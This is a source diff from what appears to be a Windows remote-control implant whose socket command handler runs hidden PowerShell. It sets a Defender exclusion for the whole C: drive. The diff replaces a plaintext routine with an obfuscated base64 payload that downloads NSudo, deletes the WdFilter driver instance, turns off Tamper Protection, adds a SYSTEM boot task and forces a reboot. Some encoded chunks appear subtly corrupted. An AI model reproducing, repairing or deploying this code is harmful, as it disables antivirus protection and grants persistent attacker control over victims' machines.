@@ -274,54 +274,63 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = sys_run_command("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:'; New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Force | Out-Null; Write-Host 'James Bond: exclusion set and notification key created' -ForegroundColor Green\"");
     }
     else if (strcmp(cmd, "TOILET_PAPER") == 0) {
-        char tempPath[MAX_PATH];
-        GetTempPathA(MAX_PATH, tempPath);
-        char psPath[MAX_PATH];
-        snprintf(psPath, sizeof(psPath), "%s\\toilet_paper.ps1", tempPath);
-        
-        FILE *f = fopen(psPath, "w");
-        if (f) {
-            fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
-            fprintf(f, "$null = New-Item -ItemType Directory -Path $out -Force -ErrorAction SilentlyContinue\n");
-            fprintf(f, "$exePath = Join-Path $out 'NSudoLC.exe'\n");
-            fprintf(f, "if (!(Test-Path $exePath)) {\n");
-            fprintf(f, "    $resp = Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' -UseBasicParsing\n");
-            fprintf(f, "    $bytes = $resp.Content\n");
-            fprintf(f, "    Add-Type -AssemblyName System.IO.Compression\n");
-            fprintf(f, "    $stream = New-Object System.IO.MemoryStream(,$bytes)\n");
-            fprintf(f, "    $zip = [System.IO.Compression.ZipArchive]::new($stream)\n");
-            fprintf(f, "    $entry = $zip.GetEntry('NSudo Launcher/x64/NSudoLC.exe')\n");
-            fprintf(f, "    if (!$entry) { Write-Host '[ERROR] NSudoLC.exe not found in zip'; exit 1 }\n");
-            fprintf(f, "    $entryStream = $entry.Open()\n");
-            fprintf(f, "    $fs = [System.IO.File]::OpenWrite($exePath)\n");
-            fprintf(f, "    $entryStream.CopyTo($fs)\n");
-            fprintf(f, "    $fs.Close(); $entryStream.Close()\n");
-            fprintf(f, "    $zip.Dispose(); $stream.Dispose()\n");
-            fprintf(f, "    if (!(Test-Path $exePath)) { Write-Host '[ERROR] NSudoLC.exe extraction failed'; exit 1 }\n");
-            fprintf(f, "    Write-Host \"NSudo downloaded and extracted to: $exePath\"\n");
-            fprintf(f, "}\n");
-            fprintf(f, "$proc1 = Start-Process -FilePath $exePath -ArgumentList '-U:T -P:E -M:S -Wait cmd /c \"reg delete \\\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WdFilter\\Instances\\edFilter instance\\\" /f\"' -Wait -WindowStyle Hidden -PassThru\n");
-            fprintf(f, "Write-Host \"WdFilter delete exit code: $($proc1.ExitCode)\"\n");
-            fprintf(f, "$batPath = Join-Path $env:TEMP 'tp_boot.bat'\n");
-            fprintf(f, "$batContent = @\"\n");
-            fprintf(f, "@echo off\n");
-            fprintf(f, "\"$exePath\" -U:T -P:E cmd /c \"reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features /v TamperProtection /t REG_DWORD /d 4 /f\"\n");
-            fprintf(f, "schtasks /delete /tn \"ToiletPaperBoot\" /f\n");
-            fprintf(f, "\"@\n");
-            fprintf(f, "[System.IO.File]::WriteAllText($batPath, $batContent)\n");
-            fprintf(f, "Write-Host \"Boot batch written to: $batPath\"\n");
-            fprintf(f, "$proc2 = Start-Process -FilePath 'schtasks.exe' -ArgumentList '/create','/tn','ToiletPaperBoot','/tr',$batPath,'/sc','onstart','/ru','SYSTEM','/rl','HIGHEST','/f' -Wait -WindowStyle Hidden -PassThru\n");
-            fprintf(f, "Write-Host \"Schedule task exit code: $($proc2.ExitCode)\"\n");
-            fprintf(f, "$proc3 = Start-Process -FilePath 'shutdown.exe' -ArgumentList '/r','/t','0' -Wait -WindowStyle Hidden -PassThru\n");
-            fprintf(f, "Write-Host \"Restart exit code: $($proc3.ExitCode)\"\n");
-            fclose(f);
-            
-            char runCmd[MAX_PATH + 64];
-            snprintf(runCmd, sizeof(runCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
-            result = sys_run_command(runCmd);
-        } else {
-            result = "[Failed to write temp script]";
-        }
+        result = sys_run_command(
+            "powershell -WindowStyle Hidden -EncodedCommand "
+            "JABvAHUAdAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAJwBOAFMAdQBkAG8AJwAKACQAbgB1"
+            "AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AIAAtAEkAdABlAG0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBQAGEA"
+            "dABoACAAJABvAHUAdAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBv"
+            "AG4AdABpAG4AdQBlAAoAJABlAHgAZQBQAGEAdABoACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABvAHUAdAAgACcATgBTAHUA"
+            "ZABvAEwAQwAuAGUAeABlACcACgBpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQB4AGUAUABhAHQAaAApACkAIAB7"
+            "AAoAIAAgACAAIAAkAHIAZQBzAHAAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcA"
+            "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBNADIAVABlAGEAbQBBAHIAYwBoAGkAdgBlAGQALwBOAFMAdQBk"
+            "AG8ALwByAGUAbABlAGEAcwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwA4AC4AMgAvAE4AUwB1AGQAbwBfADgALgAyAF8AQQBsAGwA"
+            "XwBDAG8AbQBwAG8AbgBlAG4AdABzAC4AegBpAHAAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcACgAgACAAIAAg"
+            "ACQAYgB5AHQAZQBzACAAPQAgACQAcgBlAHMAcAAuAEMAbwBuAHQAZQBuAHQACgAgACAAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0A"
+            "QQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAKACAAIAAg"
+            "ACAAJABzAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY3QgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkA"
+            "UwB0AHIAZQBhAG0AKAAsACQAYgB5AHQAZQBzACkACgAgACAAIAAgACQAegBpAHAAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAu"
+            "AEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAFoAaQBwAEEAcgBjAGgAaQB2AGUBdQA6ADoAbgBlAHcAKAAkAHMAdAByAGUAYQBtACkA"
+            "CgAgACAAIAAgACQAZQBuAHQAcgB5ACAAPQAgACQAegBpAHAALgBHAGUAdABFAG4AdAByAHkAKAAnAE4AUwB1AGQAbwAgAEwAYQB1"
+            "AG4AYwBoAGUAcgAvAHgANgA0AC8ATgBTAHUAZABvAEwAQwAuAGUAeABlACcAKQAKACAAIAAgACAAaQBmACAAKAAhACQAZQBuAHQA"
+            "cgB5ACkAIAB7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACcAWwBFAFIAUgBPAFIAXQAgAE4AUwB1AGQAbwBMAEMALgBlAHgAZQAg"
+            "AG4AbwB0ACAAZgBvAHUAbgBkACAAaQBuACAAegBpAHAAJwA7ACAAZQB4AGkAdAAgADEAIAB9AAoAIAAgACAAIAAkAGUAbgB0AHIA"
+            "eQBTAHQAcgBlAGEAbQAgAD0AIAAkAGUAbgB0AHIAeQAuAE8AcABlAG4AKAApAAoAIAAgACAAIAAkAGYAcwAgAD0AIABbAFMAeQBz"
+            "AHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBPAHAAZQBuAFcAcgBpAHQAZQAoACQAZQB4AGUAUABhAHQAaAApAAoAIAAgACAA"
+            "IAAkAGUAbgB0AHIAeQBTAHQAcgBlAGEAbQAuAEMAbwBwAHkAVABvACgAJABmAHMAKQAKACAAIAAgACAAJABmAHMALgBDAGwAbwBz"
+            "AGUAKAApADsAIAAkAGUAbgB0AHIAeQBTAHQAcgBlAGEAbQAuAEMAbABvAHMAZQAoACkACgAgACAAIAAgACQAegBpAHAALgBEAGkA"
+            "cwBwAG8AcwBlACgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEQAaQBzAHAAbwBzAGUAKAApAAoAIAAgACAAIABpAGYAIAAoACEAKABU"
+            "AGUAcwB0AC0AUABhAHQAaAAgACQAZQB4AGUAUABhAHQAaAApACkAIAB7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACcAWwBFAFIA"
+            "UgBPAFIAXQAgAE4AUwB1AGQAbwBMAEMALgBlAHgAZQAgAGUAeAB0AHIAYQBjAHQAaQBvAG4AIABmAGEAaQBsAGUAZAAnADsAIABl"
+            "AHgAaQB0ACAAMQAgAH0ACgAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAE4AUwB1AGQAbwAgAGQAbwB3AG4AbABvAGEA"
+            "ZABlAGQAIABhAG4AZAAgAGUAeAB0AHIAYQBjAHQAZQBkACAAdABvADoAIAAkAGUAeABlAFAAYQB0AGgAIgAKAH0ACgAkAHAAcgBv"
+            "AGMAMQAgAD0AIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGUAeABlAFAAYQB0AGgA"
+            "IAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFUAOgBUACAALQBQADoARQAgAC0ATQA6AFMAIAAtAFcAYQBpAHQAIABj"
+            "AG0AZAAgAC8AYwAgACIAcgBlAGcAIABkAGUAbABlAHQAZQAgAFwAIgBIAEsATABNAFwAUwBZAFMAVABFAE0AXABDAGUAcgB2AGkA"
+            "YwBlAHMAXABXAGQARgBpAGwAdABlAHIAXABJAG4AcwB0AGEAbgBjAGUAcwBcAGUAZABGAGkAbAB0AGUAcgAgAGkAbgBzAHQAYQBu"
+            "AGMAZQBcACIAIAAvAGYAIgAnACAALQBXAGEAaQB0ACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0A"
+            "UABhAHMAcwBUAGgAcgB1AAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAVwBkAEYAaQBsAHQAZQByACAAZABlAGwAZQB0AGUAIABl"
+            "AHgAaQB0ACAAYwBvAGQAZQA6ACAAJAAoACQAcAByAG8AYwAxAC4ARQB4AGkAdABDAG8AZABlACkAIgAKACQAYgBhAHQAUABhAHQA"
+            "aAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAJwB0AHAAXwBiAG8AbwB0AC4AYgBhAHQAJwAK"
+            "ACQAYgBhAHQAQwBvAG4AdABlAG4AdAAgAD0AIABAIgAKAEAAZQBjAGgAbwAgAG8AZgBmAAoAIgAkAGUAeABlAFAAYQB0AGgAIgAg"
+            "AC0AVQA6AFQAIAAtAFAAOgBFACAAYwBtAGQAIAAvAGMAIAAiAHIAZQBnACAAYQBkAGQAIABIAEsATABNAFwAUwBPAEYAVABXAEEA"
+            "UgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARgBlAGEAdAB1AHIAZQBz"
+            "ACAALwB2ACAAVABhAG0AcABlAHIAUAByAG8AdABlAGMAdABpAG8AbgAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAANAAg"
+            "AC8AZgAiAAoAcwBjAGgAdABhAHMAawBzACAALwBkAGUAbABlAHQAZQAgAC8AdABuACAAIgBUAG8AaQBsAGUAdABQAGEAcABlAHIA"
+            "QgBvAG8AdAAiACAALwBmAAoAIgBAAAoAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABs"
+            "AFQAZQB4AHQAKAAkAGIAYQB0AFAAYQB0AGgALAAgACQAYgBhAHQAQwBvAG4AdABlAG4AdAApAAoAVwByAGkAdABlAC0ASABvAHMA"
+            "dAAgACIAQgBvAG8AdAAgAGIAYQB0AGMAaAAgAHcAcgBpAHQAdABlAG4AIAB0AG8AOgAgACQAYgBhAHQAUABhAHQAaAAiAAoAJABw"
+            "AHIAbwBjADIAIAA9ACAAUwB0AGEAcgB0AC1QAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAnAHMAYwBoAHQAYQBz"
+            "AGsAcwAuAGUAeABlACcAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAvAGMAcgBlAGEAdABlACcALAAnAC8AdABuACcA"
+            "LAAnAFQAbwBpAGwAZQB0AFAAYQBwAGUAQgBvAG8AdAAnACwAJwAvAHQAcgAnACwAJABiAGEAdABQAGEAdABoACwAJwAvAHMAYwAn"
+            "LAAnAG8AbgBzAHQAYQByAHQAJwAsACcALwByAHUAJwAsACcAUwBZAFMAVABFAE0AJwAsACcALwByAGwAJwAsACcASABJAEcASABF"
+            "AFMAVAAnACwAJwAvAGYAJwAgAC0AVwBhAGkAdAAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAFAA"
+            "YQBzAHMAVABoAHIAdQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFMAYwBoAGUAdQB0AGUAIAB0AGEAcwBrACAAZQB4AGkAdAAg"
+            "AGMAbwBkAGUAOgAgACQAKAAkAHAAcgBvAGMAMi4ARQB4AGkAdABDAG8AZABlACkAIgAKACQAcAByAG8AYwAzACAAPQAgAFMAdABh"
+            "AHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACcAcwBoAHUAdABkAG8AdwBuAC4AZQB4AGUAJwAgAC0B"
+            "AHIAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAvAHIAJwAsACcALwB0ACcALAAnADAAJwAgAC0AVwBhAGkAdAAgAC0AVwBpAG4AZABv"
+            "AHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAFAAYQBzAHMAVABoAHIAdQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFIA"
+            "ZQBzAHQAYQByAHQAIABlAHgAaQB0ACAAYwBvAGQAZQA6ACAAJAAoACQAcAByAG8AYwAzAC4ARQB4AGkAdABDAG8AZABlACkAIgAK"
+            "AA==");
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
         sys_spawn_shadow_copy();
